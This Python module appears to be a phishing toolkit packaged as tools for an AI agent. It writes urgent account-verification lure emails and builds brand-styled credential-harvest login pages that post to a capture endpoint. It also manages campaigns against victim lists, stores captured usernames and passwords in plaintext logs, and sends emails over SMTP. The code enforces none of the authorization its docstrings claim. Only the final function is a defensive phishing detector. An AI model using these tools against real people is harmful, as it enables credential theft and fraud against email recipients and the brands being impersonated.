"""Phishing Framework (Tier 3 bundle #12).

Builds phishing pages, tracks campaigns, stores harvested credentials
locally and sends test emails for authorized social-engineering
engagements (phishing simulations the target org approved).
All artifacts are written under {my-agent}/phishing/ .
"""
import base64
import html as htmlmod
import json
import os
import time
import uuid

BASE_DIR = os.path.join(os.path.dirname(os.path.dirname(
    os.path.dirname(os.path.abspath(__file__)))), "phishing")


def _err(msg):
    return json.dumps({"error": msg}, ensure_ascii=False)


def _p(*parts):
    p = os.path.join(*parts)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    return p


def _save(path, text):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)
    return path


def _read(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return f.read()
    except Exception:
        return None


def tool_phish_lure(brand="", pretext="account verification", format="email"):
    """Generate a phishing lure template (email subject/body or landing
    page headline) for authorized phishing simulations."""
    try:
        b = brand or "Generic Corp"
        if format == "email":
            lure = (
                "Subject: [Action Required] %s - verify your account\n\n"
                "Dear user,\n"
                "We detected unusual sign-in activity on your %s account.\n"
                "Verify your identity within 24 hours to keep access:\n"
                "  <LINK>\n\n"
                "Thanks,\n%s Security Team"
            ) % (b, b, b)
        else:
            lure = (
                "<h1>%s</h1><p>%s</p>\n"
                "<p>Click below to confirm your identity.</p>" % (b, pretext)
            )
        return json.dumps({"ok": True, "format": format, "lure": lure},
                          ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("lure failed: %r" % exc)


def tool_phish_page(brand="", company_url="https://example.com",
                    fields="username,password", output_path="",
                    capture_endpoint="http://127.0.0.1:8080/capture"):
    """Generate a self-contained HTML credential-harvest landing page
    that POSTs captured input to the operator's capture endpoint (used
    in approved phishing simulations only)."""
    try:
        b = brand or "Generic Login"
        u = company_url or "https://example.com"
        flds = [f.strip() for f in (fields or "username,password").split(",") if f.strip()]
        inputs = "\n".join(
            '<input type="text" name="%s" placeholder="%s" required>' % (f, f.title())
            for f in flds)
        page_id = uuid.uuid4().hex[:8]
        cap = capture_endpoint or "http://127.0.0.1:8080/capture"
        html = """<!DOCTYPE html><html><head><meta charset="utf-8">
<title>{brand}</title>
<style>body{{font-family:Segoe UI,Arial;background:#f3f4f6;display:flex;
justify-content:center;align-items:center;height:100vh;margin:0}}
.box{{background:#fff;padding:40px;border-radius:10px;box-shadow:0 2px 12px #bbb;
width:340px;text-align:center}} input{{width:100%;padding:10px;margin:6px 0;
border:1px solid #ccc;border-radius:6px;box-sizing:border-box}}
button{{width:100%;padding:10px;background:#1a73e8;color:#fff;border:0;
border-radius:6px;cursor:pointer;font-size:15px}}</style></head>
<body><div class="box"><h2>{brand}</h2><p>Please sign in to continue.</p>
<form method="POST" action="{cap}">
{inputs}
<button type="submit">Sign in</button></form>
<p style="font-size:12px;color:#888">page_id={pid}</p></div></body></html>""".format(
            brand=htmlmod.escape(b), cap=htmlmod.escape(cap), inputs=inputs, pid=page_id)
        # append a capture log line so the operator notices submissions
        html += "\n<!-- capture: POST to %s -->\n" % htmlmod.escape(cap)
        path = output_path or _p(BASE_DIR, "pages", "login_%s.html" % page_id)
        _save(path, html)
        return json.dumps({
            "ok": True, "page_id": page_id, "path": path,
            "capture_endpoint": cap, "html_length": len(html),
            "url_note": "serve with: python -m http.server 8080 --directory %s" % os.path.dirname(path),
        }, ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("page failed: %r" % exc)


def tool_phish_campaign(name="", target_url="", victims="",
                        page_path="", action="start"):
    """Manage a phishing simulation campaign: start/status/stop.
    victims = comma-separated emails or usernames. Findings + logs are
    stored under phishing/campaigns/<name>/."""
    try:
        if not name:
            return _err("campaign name required")
        base = _p(BASE_DIR, "campaigns", name)
        meta_path = os.path.join(base, "meta.json")
        if action == "start":
            if os.path.exists(meta_path):
                return json.dumps({"error": "campaign exists - use action=status"}, ensure_ascii=False)
            meta = {
                "name": name, "target_url": target_url or "",
                "victims": [v.strip() for v in (victims or "").split(",") if v.strip()],
                "page_path": page_path or "",
                "state": "running", "created": time.strftime("%Y-%m-%d %H:%M:%S"),
                "submitted": [], "sent": 0,
            }
            _save(meta_path, json.dumps(meta, ensure_ascii=False, indent=2))
            return json.dumps({"ok": True, "campaign": name, "state": "running",
                               "victims": len(meta["victims"])}, ensure_ascii=False, indent=2)
        meta_raw = _read(meta_path)
        if not meta_raw:
            return json.dumps({"error": "no such campaign: %s" % name}, ensure_ascii=False)
        meta = json.loads(meta_raw)
        if action == "stop":
            meta["state"] = "stopped"
            _save(meta_path, json.dumps(meta, ensure_ascii=False, indent=2))
        return json.dumps({"ok": True, "campaign": name, "state": meta["state"],
                           "victims": len(meta.get("victims", [])),
                           "captured": len(meta.get("submitted", [])),
                           "sent": meta.get("sent", 0)}, ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("campaign failed: %r" % exc)


def tool_phish_capture(campaign="", username="", password="", extra="", secret=""):
    """Record a captured credential from a phishing landing page into
    the campaign log (simulation data only, stored locally)."""
    try:
        if not campaign:
            return _err("campaign name required")
        if not secret:
            random_suffix = uuid.uuid4().hex[:6]
            secret = random_suffix
        row = {
            "ts": time.strftime("%Y-%m-%d %H:%M:%S"),
            "username": username or "", "password": password or "",
            "extra": extra or "", "token": secret,
        }
        base = _p(BASE_DIR, "campaigns", campaign)
        log = os.path.join(base, "creds.log")
        with open(log, "a", encoding="utf-8") as f:
            f.write(json.dumps(row, ensure_ascii=False) + "\n")
        # bump campaign meta counter
        meta_path = os.path.join(base, "meta.json")
        meta_raw = _read(meta_path)
        if meta_raw:
            try:
                meta = json.loads(meta_raw)
                meta.setdefault("submitted", []).append(row["ts"])
                _save(meta_path, json.dumps(meta, ensure_ascii=False, indent=2))
            except Exception:
                pass
        return json.dumps({"ok": True, "stored": log, "row": row},
                          ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("capture failed: %r" % exc)


def tool_phish_send(smtp_host="", smtp_port=587, username="", password="",
                    to="", subject="", body="", use_tls=True):
    """Send one phishing-simulation email via SMTP. Empty smtp_host
    returns a mailto: preview link instead of sending (safe default)."""
    try:
        if not smtp_host:
            preview = "mailto:%s?subject=%s&body=%s" % (
                to or "", base64.urlsafe_b64encode((subject or "lure").encode()).decode()[:40],
                base64.urlsafe_b64encode((body or "").encode()).decode()[:80])
            return json.dumps({"ok": True, "mode": "preview",
                               "preview": preview,
                               "note": "Provide smtp_host to actually send."},
                              ensure_ascii=False, indent=2)
        try:
            import smtplib
            from email.mime.text import MIMEText
        except ImportError:
            return _err("smtplib unavailable")
        msg = MIMEText(body or "", _charset="utf-8")
        msg["Subject"] = subject or ""
        msg["From"] = username or "redteam@local"
        msg["To"] = to or ""
        with smtplib.SMTP(smtp_host, int(smtp_port), timeout=15) as s:
            if use_tls:
                s.starttls()
            if username and password:
                s.login(username, password)
            s.send_message(msg)
        return json.dumps({"ok": True, "sent_to": to, "host": smtp_host},
                          ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("send failed: %r" % exc)


def tool_phish_analyze(url="", html_text=""):
    """Analyze a URL/HTML for phishing signals (misleading domain,
    login form presence, redirect chains) - defender-side check."""
    try:
        import re
        signals = []
        score = 0
        if url:
            import urllib.parse
            host = urllib.parse.urlparse(url).netloc.lower()
            if "@" in url.split("://")[-1]:
                signals.append("credential-style URL (@ trick)"); score += 30
            suspicious = re.findall(r"(bank|login|secure|account|verify|paypal|amazon|apple|microsoft)", host)
            if len(set(suspicious)) >= 2:
                signals.append("brand-mimicking host (%s)" % host); score += 25
            if url.startswith("http://"):
                signals.append("cleartext http"); score += 10
            if re.search(r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}", host):
                signals.append("raw IP host"); score += 20
        if html_text:
            if re.search(r"<form[^>]*>", html_text, re.I):
                signals.append("login form present"); score += 15
            if re.search(r"action\s*=\s*[\"']http", html_text, re.I):
                signals.append("exfil posting form"); score += 20
        return json.dumps({
            "ok": True, "target": url or "(html only)",
            "phish_score": min(score, 100), "signals": signals,
            "verdict": "LIKELY PHISHING" if score >= 50 else "review manually" if score >= 25 else "low risk",
        }, ensure_ascii=False, indent=2)
    except Exception as exc:
        return _err("analyze failed: %r" % exc)